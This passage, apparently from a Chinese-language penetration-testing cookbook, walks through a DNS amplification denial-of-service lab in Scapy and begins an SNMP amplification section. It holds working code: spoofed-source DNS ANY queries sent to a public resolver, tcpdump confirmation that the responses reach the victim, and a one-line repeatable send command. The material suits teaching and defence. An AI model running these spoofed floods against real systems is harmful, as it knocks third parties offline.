+<pre><code>&gt;&gt;&gt; q = DNSQR() 
+&gt;&gt;&gt; q.display() 
+###[ DNS Question Record ]###  
+    qname= &apos;.&apos;  
+    qtype= A  
+    qclass= IN
+</code></pre><p>&#x4E3A;&#x4E86;&#x6784;&#x5EFA; DNS &#x95EE;&#x9898;&#x8BB0;&#x5F55;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x4F7F;&#x7528;&#x4E0E; IP&#xFF0C;UDP &#x548C; DNS &#x5C42;&#x76F8;&#x540C;&#x7684;&#x6280;&#x672F;&#x3002; &#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;DNS &#x95EE;&#x9898;&#x8BB0;&#x5F55;&#x5DF2;&#x8D4B;&#x7ED9;<code>q</code>&#x53D8;&#x91CF;&#x3002; &#x5982;&#x524D;&#x6240;&#x8FF0;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#x6765;&#x786E;&#x5B9A;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x3002; &#x5728;&#x8FD9;&#x91CC;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x51E0;&#x4E2A;&#x503C;&#x9700;&#x8981;&#x4FEE;&#x6539;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; q.qname = &apos;google.com&apos; 
+&gt;&gt;&gt; q.qtype=255 
+&gt;&gt;&gt; q.display() 
+###[ DNS Question Record ]###
+  qname= &apos;google.com&apos;
+  qtype= ALL
+  qclass= IN
+</code></pre><p><code>qname</code>&#x503C;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x4E3A;&#x8981;&#x67E5;&#x8BE2;&#x7684;&#x57DF;&#x3002; &#x53E6;&#x5916;&#xFF0C;<code>qtype</code>&#x9700;&#x8981;&#x901A;&#x8FC7;&#x4F20;&#x9012;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#x503C; 255 &#x6765;&#x8BBE;&#x7F6E;&#x4E3A;<code>ALL</code>&#x3002;&#x901A;&#x8FC7;&#x518D;&#x6B21;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x9A8C;&#x8BC1;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x8C03;&#x6574;&#x4E86;&#x914D;&#x7F6E;&#x3002; &#x73B0;&#x5728;&#x95EE;&#x9898;&#x8BB0;&#x5F55;&#x5DF2;&#x7ECF;&#x914D;&#x7F6E;&#x5B8C;&#x6BD5;&#xFF0C;&#x95EE;&#x9898;&#x8BB0;&#x5F55;&#x5BF9;&#x8C61;&#x5E94;&#x8BE5;&#x8D4B;&#x7ED9;DNS <code>qd</code>&#x503C;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; d.qd = q 
+&gt;&gt;&gt; d.display() 
+###[ DNS ]###  
+id= 0  
+qr= 0  
+opcode= QUERY
+aa= 0
+  tc= 0
+  rd= 1
+  ra= 0
+  z= 0
+  rcode= ok
+  qdcount= 1
+  ancount= 0
+  nscount= 0
+  arcount= 0
+  \qd\
+   |###[ DNS Question Record ]###
+   |
+  qname= &apos;google.com&apos;
+   |
+  qtype= ALL
+   |
+  qclass= IN
+  an= None
+  ns= None
+  ar= None
+</code></pre><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#x6765;&#x9A8C;&#x8BC1;&#x95EE;&#x9898;&#x8BB0;&#x5F55;&#x662F;&#x5426;&#x5DF2;&#x8D4B;&#x7ED9; DNS <code>qd</code>&#x503C;&#x3002; &#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x6784;&#x5EFA;&#x4E86; IP&#xFF0C;UDP &#x548C; DNS &#x5C42;&#xFF0C;&#x5E76;&#x4E14;&#x5DF2;&#x7ECF;&#x5C06;&#x76F8;&#x5E94;&#x7684;&#x95EE;&#x9898;&#x8BB0;&#x5F55;&#x8D4B;&#x7ED9; DNS &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5806;&#x53E0;&#x8FD9;&#x4E9B;&#x5C42;&#x6765;&#x6784;&#x9020;&#x8BF7;&#x6C42;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; request = (i/u/d) 
+&gt;&gt;&gt; request.display() 
+###[ IP ]###
+  version= 4
+  ihl= None
+  tos= 0x0
+  len= None
+  id= 1
+  flags=
+  frag= 0
+  ttl= 64
+  proto= udp
+  chksum= None
+  src= 172.16.36.180
+  dst= 208.67.220.220
+  \options\ 
+###[ UDP ]###
+   sport= domain
+   dport= domain
+   len= None
+   chksum= None 
+###[ DNS ]###
+  id= 0
+  qr= 0
+  opcode= QUERY
+  aa= 0
+  tc= 0
+  rd= 1
+  ra= 0
+  z= 0
+  rcode= ok
+  qdcount= 1
+  ancount= 0
+  nscount= 0
+  arcount= 0  
+  \qd\
+   |###[ DNS Question Record ]###
+   | qname= &apos;google.com&apos;
+   | qtype= ALL
+   | qclass= IN
+  an= None
+  ns= None
+  ar= None
+</code></pre><p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x659C;&#x6760;&#x5206;&#x9694;&#x53D8;&#x91CF;&#x6765;&#x5806;&#x53E0; IP&#xFF0C;UDP &#x548C; DNS &#x5C42;&#x3002; &#x7136;&#x540E;&#x53EF;&#x4EE5;&#x5C06;&#x8FD9;&#x4E9B;&#x5C42;&#x8D4B;&#x7ED9;&#x8868;&#x793A;&#x6574;&#x4E2A;&#x8BF7;&#x6C42;&#x7684;&#x65B0;&#x53D8;&#x91CF;&#x3002; &#x7136;&#x540E;&#x53EF;&#x4EE5;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#x6765;&#x67E5;&#x770B;&#x8BF7;&#x6C42;&#x7684;&#x914D;&#x7F6E;&#x3002; &#x5728;&#x53D1;&#x9001;&#x6B64;&#x8BF7;&#x6C42;&#x4E4B;&#x524D;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x4EE5;&#x76F8;&#x540C;&#x7684;&#x663E;&#x793A;&#x683C;&#x5F0F;&#x67E5;&#x770B;&#x5B83;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x67E5;&#x770B;&#x54CD;&#x5E94;&#x3002; &#x8FD9;&#x6837;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x66F4;&#x597D;&#x5730;&#x4ECE;&#x89C6;&#x89C9;&#x4E0A;&#x7406;&#x89E3;&#x8BF7;&#x6C42;&#x548C;&#x54CD;&#x5E94;&#x4E4B;&#x95F4;&#x53D1;&#x751F;&#x7684;&#x653E;&#x5927;&#x3002; &#x8FD9;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x53D8;&#x91CF;&#x6765;&#x5B8C;&#x6210;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; request 
+
+&lt;IP  frag=0 proto=udp dst=208.67.220.220 |&lt;UDP  sport=domain |&lt;DNS  rd=1 qdcount=1 qd=&lt;DNSQR  qname=&apos;google.com&apos; qtype=ALL |&gt; |&gt;&gt;&gt;
+</code></pre><p>&#x4E00;&#x65E6;&#x5EFA;&#x7ACB;&#x4E86;&#x8BF7;&#x6C42;&#xFF0C;&#x5B83;&#x5C31;&#x53EF;&#x4EE5;&#x88AB;&#x4F20;&#x9012;&#x7ED9;&#x53D1;&#x9001;&#x548C;&#x63A5;&#x6536;&#x51FD;&#x6570;&#xFF0C;&#x4EE5;&#x4FBF;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5206;&#x6790;&#x54CD;&#x5E94;&#x3002; &#x6211;&#x4EEC;&#x4E0D;&#x4F1A;&#x5C06;&#x5B83;&#x8D4B;&#x7ED9;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x800C;&#x662F;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x8BE5;&#x51FD;&#x6570;&#xFF0C;&#x4EE5;&#x4FBF;&#x53EF;&#x4EE5;&#x4EE5;&#x76F8;&#x540C;&#x7684;&#x683C;&#x5F0F;&#x67E5;&#x770B;&#x54CD;&#x5E94;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; sr1(request) 
+Begin emission: 
+....................Finished to send 1 packets. 
+.............................* 
+Received 50 packets, got 1 answers, remaining 0 packets 
+
+&lt;IP  version=4L ihl=5L tos=0x0 len=378 id=29706 flags= frag=0L ttl=128 proto=udp chksum=0x4750 src=208.67.220.220 dst=172.16.36.232 options=[] |&lt;UDP  sport=domain dport=domain len=358 chksum=0xf360 |&lt;DNS  id=0 qr=1L opcode=QUERY aa=0L tc=0L rd=1L ra=1L z=0L rcode=ok qdcount=1 ancount=17 nscount=0 arcount=0 qd=&lt;DNSQR  qname=&apos;google.com.&apos; qtype=ALL qclass=IN |&gt; an=&lt;DNSRR  rrname=&apos;google.com.&apos; type=A rclass=IN ttl=188 rdata=&apos;74.125.228.103&apos; |&lt;DNSRR  rrname=&apos;google.com.&apos; type=A rclass=IN ttl=188 rdata=&apos;74.125.228.102&apos; |&lt;DNSRR  rrname=&apos;google.com.&apos; type=A rclass=IN ttl=188 rdata=&apos;74.125.228.98&apos; |&lt;DNSRR  rrname=&apos;google.com.&apos; type=A rclass=IN ttl=188 rdata=&apos;74.125.228.96&apos; |&lt;DNSRR  rrname=&apos;google. com.&apos; type=A rclass=IN ttl=188 rdata=&apos;74.125.228.99&apos; |&lt;DNSRR  rrname=&apos;google.com.&apos; type=A rclass=IN ttl=188 rdata=&apos;74.125.228.110&apos; |&lt;DNSRR  rrname=&apos;google.com.&apos; type=A rclass=IN ttl=188 rdata=&apos;74.125.228.100&apos; |&lt;DNSRR  rrname=&apos;google.com.&apos; type=A rclass=IN ttl=188 rdata=&apos;74.125.228.97&apos; |&lt;DNSRR  rrname=&apos;google.com.&apos; type=A rclass=IN ttl=188 rdata=&apos;74.125.228.104&apos; |&lt;DNSRR  rrname=&apos;google. com.&apos; type=A rclass=IN ttl=188 rdata=&apos;74.125.228.105&apos; |&lt;DNSRR  rrname=&apos;google.com.&apos; type=A rclass=IN ttl=188 rdata=&apos;74.125.228.101&apos; |&lt;DNSRR  rrname=&apos;google.com.&apos; type=AAAA rclass=IN ttl=234 rdata=&apos;2607 :f8b0:4004:803::1002&apos; |&lt;DNSRR  rrname=&apos;google.com.&apos; type=NS rclass=IN ttl=171376 rdata=&apos;ns2.google.com.&apos; |&lt;DNSRR  rrname=&apos;google.com.&apos; type=NS rclass=IN ttl=171376 rdata=&apos;ns1.google.com.&apos; |&lt;DNSRR  rrname=&apos;google. com.&apos; type=NS rclass=IN ttl=171376 rdata=&apos;ns3.google.com.&apos; |&lt;DNSRR  rrname=&apos;google.com.&apos; type=NS rclass=IN ttl=171376 rdata=&apos;ns4.google.com.&apos; |&lt;DNSRR  rrname=&apos;google.com.&apos; type=SOA rclass=IN ttl=595 rdata=&apos;\xc1\x06\ tdns-admin\xc0\x0c\x00\x17\xd0`\x00\x00\x1c \x00\x00\x07\x08\x00\x12u\ x00\x00\x00\x01,&apos; |&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ns=None ar=None |&gt;&gt;&gt;
+</code></pre><p>&#x8BE5;&#x54CD;&#x5E94;&#x786E;&#x8BA4;&#x4E86;&#x6211;&#x4EEC;&#x5DF2;&#x6210;&#x529F;&#x6784;&#x5EFA;&#x6240;&#x9700;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x5DF2;&#x8BF7;&#x6C42;&#x4E86;&#x4E00;&#x4E2A;&#x76F8;&#x5F53;&#x5927;&#x7684;&#x6709;&#x6548;&#x5185;&#x5BB9;&#xFF0C;&#x5176;&#x4E2D;&#x5305;&#x62EC;<code>google.com</code>&#x57DF;&#x7684;11&#x4E2A;A&#x8BB0;&#x5F55;&#xFF0C;1&#x4E2A;AAAA&#x8BB0;&#x5F55;&#xFF0C;4&#x4E2A;NS&#x8BB0;&#x5F55;&#x548C;1&#x4E2A;SOA&#x8BB0;&#x5F55;&#x3002; &#x6B64;&#x7EC3;&#x4E60;&#x6E05;&#x695A;&#x5730;&#x8868;&#x660E;&#xFF0C;&#x8BF7;&#x6C42;&#x7684;&#x54CD;&#x5E94;&#x660E;&#x663E;&#x5927;&#x4E8E;&#x8BF7;&#x6C42;&#x672C;&#x8EAB;&#x3002; &#x4E3A;&#x4E86;&#x4F7F;&#x8FD9;&#x4E2A;&#x653E;&#x5927;&#x653B;&#x51FB;&#x6709;&#x6548;&#xFF0C;&#x5B83;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x4F2A;&#x9020;&#x6E90; IP &#x5730;&#x5740;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x6807;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; i.src = &quot;172.16.36.135&quot; 
+&gt;&gt;&gt; i.display()
+###[ IP ]###
+  version= 4
+  ihl= None
+  tos= 0x0
+  len= None
+  id= 1
+  flags=
+  frag= 0
+  ttl= 64
+  proto= ip
+  chksum= None
+  src= 172.16.36.135
+  dst= 208.67.220.220
+  \options\ 
+&gt;&gt;&gt; request = (i/u/d) 
+&gt;&gt;&gt; request 
+&lt;IP  frag=0 proto=udp src=172.16.36.135 dst=208.67.220.220 |&lt;UDP  sport=domain |&lt;DNS  rd=1 qdcount=1 qd=&lt;DNSQR  qname=&apos;google.com&apos; qtype=ALL |&gt; |&gt;&gt;&gt;
+</code></pre><p>&#x5C06;&#x6E90; IP &#x5730;&#x5740;&#x503C;&#x91CD;&#x65B0;&#x5B9A;&#x4E49;&#x4E3A;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x7684; IP &#x5730;&#x5740;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#x786E;&#x8BA4;&#x8BE5;&#x503C;&#x5DF2;&#x8C03;&#x6574;&#x3002; &#x7136;&#x540E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x91CD;&#x5EFA;&#x6211;&#x4EEC;&#x7684;&#x66F4;&#x6539;&#x540E;&#x7684;&#x8BF7;&#x6C42;&#x3002; &#x4E3A;&#x4E86;&#x9A8C;&#x8BC1;&#x6211;&#x4EEC;&#x662F;&#x5426;&#x80FD;&#x591F;&#x5C06; DNS &#x67E5;&#x8BE2;&#x54CD;&#x5E94;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x6B64;&#x4F2A;&#x9020;&#x4E3B;&#x673A;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x4E3B;&#x673A;&#x4E0A;&#x542F;&#x52A8; TCPdump&#xFF1A;</p>
+<pre><code>admin@ubuntu:~$ sudo tcpdump -i eth0 src 208.67.220.220 -vv 
+[sudo] password for admin: 
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
+</code></pre><p>&#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;TCPdump &#x914D;&#x7F6E;&#x5C06;&#x6355;&#x83B7;<code>eth0</code>&#x63A5;&#x53E3;&#x4E0A;&#xFF0C;&#x6765;&#x81EA;<code>208.67.220.220</code>&#x6E90;&#x5730;&#x5740;&#xFF08;&#x67E5;&#x8BE2;&#x7684;DNS&#x670D;&#x52A1;&#x5668;&#x7684;&#x5730;&#x5740;&#xFF09;&#x7684;&#x6240;&#x6709;&#x6D41;&#x91CF;&#x3002; &#x7136;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>send()</code>&#x51FD;&#x6570;&#x53D1;&#x9001;&#x6211;&#x4EEC;&#x7684;&#x8BF7;&#x6C42;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; send(request) 
+. 
+Sent 1 packets. 
+&gt;&gt;&gt; send(request) 
+. 
+Sent 1 packets.
+</code></pre><p>&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x8FD4;&#x56DE;&#x5230; TCPdump &#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6765;&#x9A8C;&#x8BC1; DNS &#x67E5;&#x8BE2;&#x7684;&#x54CD;&#x5E94;&#x662F;&#x5426;&#x8FD4;&#x56DE;&#x7ED9;&#x4E86;&#x53D7;&#x5BB3;&#x670D;&#x52A1;&#x5668;&#xFF1A;</p>
+<pre><code>tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes 
+19:07:12.926773 IP (tos 0x0, ttl 128, id 11341, offset 0, flags [none], proto UDP (17), length 350) resolver2.opendns.com.domain &gt; 172.16.36.135. domain: [udp sum ok] 0 q: ANY? google.com. 16/0/0 google.com. A yyz08s13in-f4.1e100.net, google.com. A yyz08s13-in-f5.1e100.net, google. com. A yyz08s13-in-f14.1e100.net, google.com. A yyz08s13-in-f6.1e100. net, google.com. A yyz08s13-in-f2.1e100.net, google.com. A yyz08s13in-f0.1e100.net, google.com. A yyz08s13-in-f3.1e100.net, google.com. A yyz08s13-in-f1.1e100.net, google.com. A yyz08s13-in-f9.1e100.net, google. com. A yyz08s13-in-f7.1e100.net, google.com. A yyz08s13-in-f8.1e100.net, google.com. NS ns2.google.com., google.com. NS ns1.google.com., google. com. NS ns3.google.com., google.com. NS ns4.google.com., google.com. SOA ns1.google.com. dns-admin.google.com. 1545677 7200 1800 1209600 300 (322) 
+19:07:15.448636 IP (tos 0x0, ttl 128, id 11359, offset 0, flags [none], proto UDP (17), length 350) resolver2.opendns.com.domain &gt; 172.16.36.135. domain: [udp sum ok] 0 q: ANY? google.com. 16/0/0 google.com. A yyz08s13in-f14.1e100.net, google.com. A yyz08s13-in-f6.1e100.net, google.com. A yyz08s13-in-f2.1e100.net, google.com. A yyz08s13-in-f0.1e100.net, google. com. A yyz08s13-in-f3.1e100.net, google.com. A yyz08s13-in-f1.1e100. net, google.com. A yyz08s13-in-f9.1e100.net, google.com. A yyz08s13in-f7.1e100.net, google.com. A yyz08s13-in-f8.1e100.net, google.com. A yyz08s13-in-f4.1e100.net, google.com. A yyz08s13-in-f5.1e100.net, google. com. NS ns2.google.com., google.com. NS ns1.google.com., google.com. NS ns3.google.com., google.com. NS ns4.google.com., google.com. SOA ns1. google.com. dns-admin.google.com. 1545677 7200 1800 1209600 300 (322)
+</code></pre><p>&#x8FD9;&#x4E2A;&#x6267;&#x884C; DNS &#x653E;&#x5927;&#x7684;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x53EF;&#x4EE5;&#x7528; Scapy &#x4E2D;&#x7684;&#x5355;&#x884C;&#x547D;&#x4EE4;&#x6765;&#x6267;&#x884C;&#x3002; &#x6B64;&#x547D;&#x4EE4;&#x4F7F;&#x7528;&#x6240;&#x6709;&#x4E0E;&#x4E0A;&#x4E00;&#x4E2A;&#x7EC3;&#x4E60;&#x4E2D;&#x8BA8;&#x8BBA;&#x7684;&#x76F8;&#x540C;&#x7684;&#x503C;&#x3002; &#x7136;&#x540E;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;<code>count</code>&#x503C;&#x4EE5;&#x5B9A;&#x4E49;&#x8981;&#x53D1;&#x9001;&#x5230;&#x53D7;&#x5BB3;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8F7D;&#x8377;&#x54CD;&#x5E94;&#x6570;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; send(IP(dst=&quot;208.67.220.220&quot;,src=&quot;172.16.36.135&quot;)/UDP()/DNS(rd=1,qdco unt=1,qd=DNSQR(qname=&quot;google.com&quot;,qtype=255)),verbose=1,count=2) 
+.. 
+Sent 2 packets.
+</code></pre><h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>&#x653E;&#x5927;&#x653B;&#x51FB;&#x7684;&#x539F;&#x7406;&#x662F;&#x5229;&#x7528;&#x7B2C;&#x4E09;&#x65B9;&#x8BBE;&#x5907;&#xFF0C;&#x4F7F;&#x7F51;&#x7EDC;&#x6D41;&#x91CF;&#x538B;&#x5012;&#x76EE;&#x6807;&#x3002; &#x5BF9;&#x4E8E;&#x591A;&#x6570;&#x653E;&#x5927;&#x653B;&#x51FB;&#xFF0C;&#x5FC5;&#x987B;&#x6EE1;&#x8DB3;&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#xFF1A;</p>
+<ul>
+<li>&#x7528;&#x4E8E;&#x6267;&#x884C;&#x653B;&#x51FB;&#x7684;&#x534F;&#x8BAE;&#x4E0D;&#x9A8C;&#x8BC1;&#x8BF7;&#x6C42;&#x6E90;</li>
+<li>&#x6765;&#x81EA;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x7F51;&#x7EDC;&#x529F;&#x80FD;&#x7684;&#x54CD;&#x5E94;&#x5E94;&#x8BE5;&#x663E;&#x7740;&#x5927;&#x4E8E;&#x7528;&#x4E8E;&#x8BF7;&#x6C42;&#x5B83;&#x7684;&#x8BF7;&#x6C42;&#x3002;</li>
+</ul>
+<p>DNS &#x653E;&#x5927;&#x653B;&#x51FB;&#x7684;&#x6548;&#x7387;&#x53D6;&#x51B3;&#x4E8E; DNS &#x67E5;&#x8BE2;&#x7684;&#x54CD;&#x5E94;&#x5927;&#x5C0F;&#x3002; &#x53E6;&#x5916;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x591A;&#x4E2A; DNS &#x670D;&#x52A1;&#x5668;&#x6765;&#x589E;&#x52A0;&#x653B;&#x51FB;&#x7684;&#x5A01;&#x529B;&#x3002;</p>
+<h2 id="65-snmp-&#x653E;&#x5927;-dos-&#x653B;&#x51FB;">6.5 SNMP &#x653E;&#x5927; DoS &#x653B;&#x51FB;</h2>
+<p>SNMP &#x6269;&#x5C55;&#x653B;&#x51FB;&#x901A;&#x8FC7;&#x4F2A;&#x9020;&#x5177;&#x6709;&#x5927;&#x578B;&#x54CD;&#x5E94;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x6765;&#x5229;&#x7528;&#x56E2;&#x4F53;&#x5B57;&#x7B26;&#x4E32;&#x53EF;&#x9884;&#x6D4B;&#x7684; SNMP &#x8BBE;&#x5907;&#x3002; &#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x5206;&#x5E03;&#x5F0F; DDoS &#x7EC4;&#x4EF6;&#xFF0C;&#x4EE5;&#x53CA;&#x901A;&#x8FC7;&#x540C;&#x65F6;&#x5411;&#x591A;&#x4E2A; SNMP &#x8BBE;&#x5907;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#xFF0C;&#x53EF;&#x4EE5;&#x63D0;&#x9AD8;&#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x7684;&#x6548;&#x7387;&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x4E3A;&#x4E86;&#x6A21;&#x62DF; SNMP &#x653E;&#x5927;&#x653B;&#x51FB;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x542F;&#x7528; SNMP &#x7684;&#x8BBE;&#x5907;&#x3002; &#x6240;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4F7F;&#x7528; Windows XP &#x8BBE;&#x5907;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Windows &#x7CFB;&#x7EDF;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Windows Server&#x201D;&#x79D8;&#x7C4D;&#x3002; &#x6B64;&#x5916;&#xFF0C;&#x6B64;&#x79D8;&#x7C4D;&#x5C06; Ubuntu &#x7528;&#x4F5C;&#x626B;&#x63CF;&#x76EE;&#x6807;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Ubuntu &#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Ubuntu Server&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
+<p>&#x4E3A;&#x4E86;&#x5F00;&#x59CB;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x521D;&#x59CB;&#x5316;&#x4E00;&#x4E2A; SNMP &#x67E5;&#x8BE2;&#xFF0C;&#x4F7F;&#x5176;&#x8FD4;&#x56DE;&#x5230;&#x6211;&#x4EEC;&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x6765;&#x8BC4;&#x4F30;&#x8981;&#x4F7F;&#x7528;&#x7684;&#x8F7D;&#x8377;&#x5927;&#x5C0F;&#x3002; &#x4E3A;&#x4E86;&#x53D1;&#x9001;&#x6211;&#x4EEC;&#x7684; SNMP &#x67E5;&#x8BE2;&#x8BF7;&#x6C42;&#xFF0C;&#x6211;&#x4EEC;&#x5FC5;&#x987B;&#x9996;&#x5148;&#x6784;&#x5EFA;&#x6B64;&#x8BF7;&#x6C42;&#x7684;&#x5C42;&#x7EA7;&#x3002; &#x6211;&#x4EEC;&#x9700;&#x8981;&#x6784;&#x5EFA;&#x7684;&#x7B2C;&#x4E00;&#x5C42;&#x662F; IP &#x5C42;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; i = IP() 
+&gt;&gt;&gt; i.display() 
+###[ IP ]###
+  version= 4
+  ihl= None
+  tos= 0x0
+  len= None
+  id= 1
+  flags=
+  frag= 0
+  ttl= 64
+  proto= ip
+  chksum= None
+  src= 127.0.0.1
+  dst= 127.0.0.1
+  \options\ 
+&gt;&gt;&gt; i.dst = &quot;172.16.36.134&quot; 
+&gt;&gt;&gt; i.display() 
+###[ IP ]###
+  version= 4
+  ihl= None
+  tos= 0x0
+  len= None
+  id= 1
+  flags=
+  frag= 0
+  ttl= 64
+  proto= ip
+  chksum= None
+  src= 172.16.36.224
+  dst= 172.16.36.134
+  \options\
+</code></pre><p>&#x8981;&#x6784;&#x5EFA;&#x6211;&#x4EEC;&#x7684;&#x8BF7;&#x6C42;&#x7684; IP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x5C06; <code>IP</code> &#x5BF9;&#x8C61;&#x8D4B;&#x7ED9;&#x53D8;&#x91CF;<code>i</code>&#x3002; &#x901A;&#x8FC7;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x786E;&#x5B9A;&#x8BE5;&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#x914D;&#x7F6E;&#x3002; &#x901A;&#x5E38;&#xFF0C;&#x53D1;&#x9001;&#x548C;&#x63A5;&#x6536;&#x5730;&#x5740;&#x90FD;&#x8BBE;&#x4E3A;&#x56DE;&#x9001;&#x5730;&#x5740;<code>127.0.0.1</code>&#x3002; &#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5C06;<code>i.dst</code>&#x8BBE;&#x7F6E;&#x4E3A;&#x5E7F;&#x64AD;&#x5730;&#x5740;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x503C;&#xFF0C;&#x6765;&#x66F4;&#x6539;&#x76EE;&#x6807;&#x5730;&#x5740;&#x5E76;&#x4FEE;&#x6539;&#x8FD9;&#x4E9B;&#x503C;&#x3002; &#x901A;&#x8FC7;&#x518D;&#x6B21;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x4E0D;&#x4EC5;&#x66F4;&#x65B0;&#x4E86;&#x76EE;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x800C;&#x4E14;<code>Scapy</code>&#x4E5F;&#x4F1A;&#x81EA;&#x52A8;&#x5C06;&#x6E90; IP &#x5730;&#x5740;&#x66F4;&#x65B0;&#x4E3A;&#x4E0E;&#x9ED8;&#x8BA4;&#x63A5;&#x53E3;&#x76F8;&#x5173;&#x7684;&#x5730;&#x5740;&#x3002; &#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x6784;&#x5EFA;&#x4E86;&#x8BF7;&#x6C42;&#x7684; IP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x7EE7;&#x7EED;&#x6784;&#x5EFA; UDP &#x5C42;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; u = UDP() 
+&gt;&gt;&gt; u.display() 
+###[ UDP ]###  
